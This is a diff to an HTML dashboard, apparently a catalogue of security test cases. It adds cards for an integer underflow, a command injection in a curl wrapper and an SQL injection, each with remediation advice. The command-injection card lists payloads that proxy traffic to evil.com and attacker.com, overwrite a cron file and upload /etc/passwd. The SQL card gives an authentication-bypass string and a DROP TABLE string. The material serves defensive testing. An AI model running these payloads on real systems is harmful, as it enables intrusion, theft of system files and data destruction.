@@ -592,11 +592,11 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">167</div>
+        <div class="metric-value">170</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
-        <div class="metric-value">2026-01-22</div>
+        <div class="metric-value">2026-01-28</div>
       </div>
     </section>
 
@@ -604,7 +604,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>80</span></div>
+      <div class="analytics-label">Web App <span>81</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -612,7 +612,7 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>54</span></div>
+      <div class="analytics-label">Network <span>55</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:68%"></div>
       </div>
@@ -628,9 +628,9 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Source Code <span>11</span></div>
+      <div class="analytics-label">Source Code <span>12</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:14%"></div>
+        <div class="analytics-bar-fill" style="width:15%"></div>
       </div>
     </div>
     
@@ -676,11 +676,11 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (167)</option>
-          <option value="Web App">Web App (80)</option>
-<option value="Network">Network (54)</option>
+          <option value="all">All Categories (170)</option>
+          <option value="Web App">Web App (81)</option>
+<option value="Network">Network (55)</option>
 <option value="API">API (17)</option>
-<option value="Source Code">Source Code (11)</option>
+<option value="Source Code">Source Code (12)</option>
 <option value="Other">Other (2)</option>
 <option value="Blockchain">Blockchain (1)</option>
 <option value="Desktop App">Desktop App (1)</option>
@@ -693,6 +693,104 @@
 
     <section class="cards" id="cardContainer">
       
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Integer Underflow in Variable Length Calculation</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-28</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An integer underflow vulnerability exists within a variable length calculation function. A flawed calculation fails to validate input boundaries, resulting in a wrapped-around value that leads to memory corruption and potential denial of service. This allows for manipulation of memory regions used for variable storage.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Set a breakpoint within the variable length calculation function.</li>
+<li>Manipulate the input parameters: <code>startoffset = 100</code> <code>endoffset = 50</code>.</li>
+<li>Observe the calculation of the variable content length (<code>clen</code>). The value of <code>clen</code> should be checked after calculation and its value when cast to <code>size_t</code>.</li>
+<li>Inspect the downstream functions that utilize the calculated value of <code>clen</code> to verify proper length validation.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The exploitation of this vulnerability can lead to heap buffer overflows or denial of service conditions by causing out-of-memory errors or application crashes due to the incorrect length being used in memory operations.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement input validation checks to ensure that the start offset is not greater than the end offset before performing calculations. This will prevent the integer underflow and subsequent memory corruption issues.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Command Injection via Unquoted Variable in curl Wrapper</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-28</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject arbitrary commands into the underlying <code>curl</code> process through an unescaped variable within a <code>curl</code> wrapper tool. The issue arises when the tool fails to properly sanitize or quote user-supplied input passed directly to <code>curl</code>&#x27;s options, enabling command injection. This can lead to arbitrary code execution on the server running the tool.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Execute the <code>wcurl</code> command with a crafted <code>--curl-options</code> parameter containing command injection payloads.</li>
+<li>Construct the <code>--curl-options</code> parameter to include malicious commands using <code>-o</code> to overwrite files.</li>
+<li>Observe the resulting execution of the injected commands on the system.</li>
+</ol>
+
+<p>Example Payloads:</p>
+<ul>
+<li><code>-x http://evil.com:8080 -o /tmp/pwned</code> (exfiltrates data via HTTP proxy and overwrites a file)</li>
+<li><code>-o /etc/cron.d/backdoor</code> (overwrites a cron job file)</li>
+<li><code>-x http://attacker.com:8080</code> (exfiltrates data via HTTP proxy)</li>
+<li><code>-T /etc/passwd</code> (attempts to steal a system file)</li>
+</ul>
+
+<p>Example Command:</p>
+<pre><code>wcurl --dry-run --curl-options=&#x27;-x http://evil.com:8080 -o /tmp/pwned&#x27; https://example.com/test.txt</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The exploitation of this vulnerability can lead to arbitrary code execution on the system hosting the <code>wcurl</code> tool. This may include, but is not limited to, the ability to modify system files, install backdoors, exfiltrate sensitive data, or compromise the entire system.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> The <code>wcurl</code> tool should properly sanitize or quote the <code>--curl-options</code> parameter before passing it to the <code>curl</code> command. Implement input validation and output encoding to prevent command injection.  Use a safe API for constructing command-line arguments to avoid shell injection vulnerabilities. If possible, refactor the code to avoid direct use of unescaped user input in shell commands.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">SQL Injection via &lt;PARAMETER&gt;</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-28</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves the possibility of SQL injection, allowing an attacker to manipulate database queries through user-supplied input.  Insufficient input sanitization can lead to unauthorized data access, modification, or deletion, potentially compromising the entire application. This flaw is a common risk in web applications that directly incorporate user input into SQL queries.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Access the vulnerable endpoint via HTTP GET or POST.</li>
+<li>Identify a parameter (&lt;PARAMETER&gt;) that is likely used in a database query.</li>
+<li>Inject a malicious SQL payload into the &lt;PARAMETER&gt;.  For example, <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code> can be used to bypass authentication or retrieve all records.</li>
+<li>Observe the application&#x27;s response. Successful injection will result in unexpected behavior or data being returned.</li>
+<li>To confirm the vulnerability, attempt more complex SQL queries like <code>&#x27;; DROP TABLE users; --</code> to demonstrate data manipulation.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can leverage this SQL injection to gain unauthorized access to sensitive data, modify database records, potentially compromise user accounts, or even execute arbitrary commands on the database server.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Always use parameterized queries or prepared statements when interacting with a database.  Input validation and output encoding are also important defenses, but should not be relied upon as the sole protection against SQL injection. Implement a Web Application Firewall (WAF) with SQL injection rules.</p>
+      </div>
+    </article>
+    
+
     <article class="card" data-category="Network">
       <button type="button" class="card-toggle">
         <span class="card-title">
